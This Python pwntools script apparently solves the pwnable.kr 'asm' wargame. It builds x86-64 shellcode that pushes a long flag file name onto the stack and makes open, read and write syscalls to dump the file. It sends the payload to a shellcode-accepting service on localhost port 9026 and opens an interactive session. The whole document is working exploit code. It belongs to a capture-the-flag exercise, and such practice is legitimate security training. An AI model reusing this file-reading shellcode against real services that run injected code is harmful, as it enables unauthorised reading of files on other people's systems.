from pwn import *

def str2bytes(s):
	ret = []
	for i in range(0, len(s), 8):
		sub = s[i:i+8][::-1]
		cur = 0
		for x in sub:
			cur <<= 8
			cur |= ord(x)
		ret.append(cur)
	return ret[::-1]

toks = list(map(hex, str2bytes('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')))
push_filename_inst = ''
for tok in toks:
	push_filename_inst += 'movabs rax, %s\npush rax\n' % tok

shellcode='''
mov rax,0
push rax

'''

shellcode += push_filename_inst

shellcode += '''
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 2
syscall
mov rsi, rsp
mov rdi, rax
mov rdx, 67
mov rax, 0
syscall
mov rdi, 1
mov rsi, rsp
mov rdx, 67
mov rax, 1
syscall
'''

sh_bytes = asm(shellcode, bits=64, arch='amd64')
sh_bytes_str = sh_bytes.encode('hex')
print(sh_bytes_str)
print(disasm(bytearray.fromhex(sh_bytes_str),bits=64,arch='amd64'))

p = remote('localhost', 9026)
p.readuntil(b'shellcode: ')
p.sendline(sh_bytes)

p.interactive()